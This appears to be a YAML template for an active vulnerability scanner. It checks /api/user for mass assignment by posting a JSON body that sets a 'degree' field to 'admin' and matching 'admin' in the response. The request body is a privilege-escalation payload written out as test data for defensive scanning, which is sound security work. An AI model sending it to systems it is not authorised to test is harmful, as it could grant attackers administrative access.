id: mass3-232
name: 'Mass field degree'
severity: high
type: active
tags:
  - mass-assignment
  - auth
  - api
description: 'Unfiltered degree on /api/user'
requests:
  - method: POST
    path: '{{BaseURL}}/api/user'
    body: '{"name":"t","degree":"admin"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
